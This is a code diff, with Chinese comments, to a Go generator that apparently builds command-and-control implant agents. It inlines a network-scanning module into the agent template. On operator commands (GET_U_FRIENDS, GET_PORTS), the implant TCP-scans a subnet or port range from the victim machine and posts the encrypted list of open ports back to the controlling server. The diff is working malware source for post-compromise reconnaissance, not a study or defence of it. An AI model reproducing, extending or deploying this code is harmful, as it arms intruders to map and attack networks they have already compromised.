@@ -10,7 +10,7 @@ func Generate_agent(protocol, os, server, Path, ConnPath, MsgPath,
     if protocol == "" || os == "" || server == "" || Path == "" || ConnPath == "" || MsgPath == "" || switch_key == "" || download == "" || result == "" || _net == "" || info == "" || upload == "" || list == "" || option == "" || Username == "" || uid == "" || hostname == "" || keyPart == "" || filekey == "" || code == "" || base_rounds == "" {
         return "parameter null"
     }
-    var protocol_str, os_str, main_str, sys_str, tls_str,package_str,send,scan_str,scan_func,inithttp,prototime,protocol_var,protocol_var1,header string
+    var protocol_str, os_str, main_str, sys_str, tls_str,package_str,send,inithttp,prototime,protocol_var,protocol_var1,header string
 	if protocol == "https" {
 		tls_str = `"crypto/tls"`
 	}else if protocol == "quic"{
@@ -359,86 +359,6 @@ func send() { //发送头部信息
             post(data, re_url)
         }
         `
-        scan_str = `
-        func split_comment(portList string)[]string{
-            var temp_split []string
-            var port_list []string
-            if strings.Contains(portList, ",") {
-                temp_split = strings.Split(portList, ",")
-                return temp_split
-            } else if strings.Contains(portList, "-") {
-                temp_split = strings.Split(portList, "-")
-                start_port,_:= strconv.Atoi(temp_split[0])
-                end_port,_:= strconv.Atoi(temp_split[1])
-                for i := start_port; i <= end_port; i++ {
-                    str:=strconv.Itoa(i)
-                    port_list = append(port_list, str)
-                }
-            } else {
-                port_list = append(port_list, portList)
-                return port_list
-            }
-            return port_list
-        }
-        func scan_u_firends(ip, portList, delay, option string) {
-            var resultBuilder strings.Builder
-            var mutex sync.Mutex
-            var open_ports, re_url string
-            port_list := split_comment(portList)
-            if len(port_list) > 65535 {
-                return
-            }
-            sleep_time, err := strconv.Atoi(delay)
-			if err != nil || sleep_time <= 0 {
-	            return
-	        }
-            if option == "port" {
-                for _, port := range port_list {
-                    time.Sleep(time.Duration(sleep_time) * time.Second)
-                    scan_port(ip, port, sleep_time,&resultBuilder, &mutex)
-                }
-            } else if option == "ping" {
-                ip_split := strings.Split(ip, ".")
-                new_ip := strings.Join(ip_split[:3], ".") + "."
-                ping_list := split_comment(ip_split[3])
-                if len(ping_list) > 255 {
-                    return
-                }
-                for _, i := range ping_list {
-                    target := new_ip + i
-                    for _, p := range port_list {
-                        time.Sleep(time.Duration(sleep_time) * time.Second)
-                        scan_port(target, p, sleep_time,&resultBuilder, &mutex)
-                    }
-                }
-            }
-            open_ports = resultBuilder.String()
-            encrypted_data := get_encry_s(&open_ports)
-            data := map[string]string{
-                "/*uid*/":    uid,
-                "/*result*/": encrypted_data,
-            }
-            re_url = protocol + master + "//*Path*/?/*option*/=/*_net*/"
-            post(data, re_url)
-        }
-        func scan_port(ip, port string, sleep_time int, resultBuilder *strings.Builder, mutex *sync.Mutex) {
-		    timeout := time.Duration(sleep_time) * time.Second
-			host := strings.TrimSpace(ip)
-		    host = strings.TrimPrefix(host, "[")
-		    host = strings.TrimSuffix(host, "]")
-			addr := net.JoinHostPort(host, port)
-		    conn, err := net.DialTimeout("tcp", addr, timeout)
-		    if err != nil {return}
-		    defer conn.Close()
-		    target := host + ":[" + port + "]"
-		    mutex.Lock()
-		    resultBuilder.WriteString(target + "\n")
-		    mutex.Unlock()
-		}`
-        scan_func = `case "GET_U_FRIENDS":
-                        go scan_u_firends(shell, msg[2], msg[3], "ping")
-                    case "GET_PORTS":
-                        go scan_u_firends(shell, msg[2], msg[3], "port")`
     }
     if protocol == "quic"{
         inithttp = `
@@ -782,7 +702,10 @@ func send() { //发送头部信息
                 shell = string(msg[1])
             }
             switch job {
-            /*scan_func*/
+            case "GET_U_FRIENDS":
+                go scan_u_firends(shell, msg[2], msg[3], "ping")
+            case "GET_PORTS":
+                go scan_u_firends(shell, msg[2], msg[3], "port")
             case "GET_DELAY":
                 GET_DELAY(shell)
             case "GET_JITTER":
@@ -903,7 +826,81 @@ func send() { //发送头部信息
         /*prototime*/
         return
     }
-    /*scan_str*/
+    func split_comment(portList string)[]string{
+        var temp_split []string
+        var port_list []string
+        if strings.Contains(portList, ",") {
+            temp_split = strings.Split(portList, ",")
+            return temp_split
+        } else if strings.Contains(portList, "-") {
+            temp_split = strings.Split(portList, "-")
+            start_port,_:= strconv.Atoi(temp_split[0])
+            end_port,_:= strconv.Atoi(temp_split[1])
+            for i := start_port; i <= end_port; i++ {
+                str:=strconv.Itoa(i)
+                port_list = append(port_list, str)
+            }
+        } else {
+            port_list = append(port_list, portList)
+            return port_list
+        }
+        return port_list
+    }
+    func scan_u_firends(ip, portList, delay, option string) {
+        var resultBuilder strings.Builder
+        var mutex sync.Mutex
+        var open_ports, re_url string
+        port_list := split_comment(portList)
+        if len(port_list) > 65535 {
+            return
+        }
+        sleep_time, err := strconv.Atoi(delay)
+        if err != nil || sleep_time <= 0 {
+            return
+        }
+        if option == "port" {
+            for _, port := range port_list {
+                time.Sleep(time.Duration(sleep_time) * time.Second)
+                scan_port(ip, port, sleep_time,&resultBuilder, &mutex)
+            }
+        } else if option == "ping" {
+            ip_split := strings.Split(ip, ".")
+            new_ip := strings.Join(ip_split[:3], ".") + "."
+            ping_list := split_comment(ip_split[3])
+            if len(ping_list) > 255 {
+                return
+            }
+            for _, i := range ping_list {
+                target := new_ip + i
+                for _, p := range port_list {
+                    time.Sleep(time.Duration(sleep_time) * time.Second)
+                    scan_port(target, p, sleep_time,&resultBuilder, &mutex)
+                }
+            }
+        }
+        open_ports = resultBuilder.String()
+        encrypted_data := get_encry_s(&open_ports)
+        data := map[string]string{
+            "/*uid*/":    uid,
+            "/*result*/": encrypted_data,
+        }
+        re_url = protocol + master + "//*Path*/?/*option*/=/*_net*/"
+        post(data, re_url)
+    }
+    func scan_port(ip, port string, sleep_time int, resultBuilder *strings.Builder, mutex *sync.Mutex) {
+        timeout := time.Duration(sleep_time) * time.Second
+        host := strings.TrimSpace(ip)
+        host = strings.TrimPrefix(host, "[")
+        host = strings.TrimSuffix(host, "]")
+        addr := net.JoinHostPort(host, port)
+        conn, err := net.DialTimeout("tcp", addr, timeout)
+        if err != nil {return}
+        defer conn.Close()
+        target := host + ":[" + port + "]"
+        mutex.Lock()
+        resultBuilder.WriteString(target + "\n")
+        mutex.Unlock()
+    }
     func getInternalIPs() string {
         var ips []string
         interfaces, _ := net.Interfaces()
@@ -1198,8 +1195,6 @@ func send() { //发送头部信息
         `/\*code\*/`:              code,
         `/\*base_rounds\*/`:      base_rounds,
         `/\*send\*/`:             send,
-        `/\*scan_str\*/`:         scan_str,
-        `/\*scan_func\*/`:        scan_func,
         `/\*inithttp\*/`:         inithttp,   
         `/\*prototime\*/`:         prototime,
         `/\*protocol_var1\*/`:    protocol_var1,
@@ -1209,10 +1204,8 @@ func send() { //发送头部信息
 	processedCode := replacePlaceholders(code, replacements, `/\*code\*/`)
     // 再将 send 字符串中的关键词进行替换
     processedSend := replacePlaceholders(send, replacements, `/\*send\*/`)
-    processedscan := replacePlaceholders(scan_str, replacements, `/\*scan_str\*/`)
     // 更新 replacements 中的 send
     replacements[`/\*send\*/`] = processedSend
-    replacements[`/\*scan_str\*/`] = processedscan
     // 最后整体替换模板
     final := applyTemplate(templateStr, processedCode, replacements)
     return final
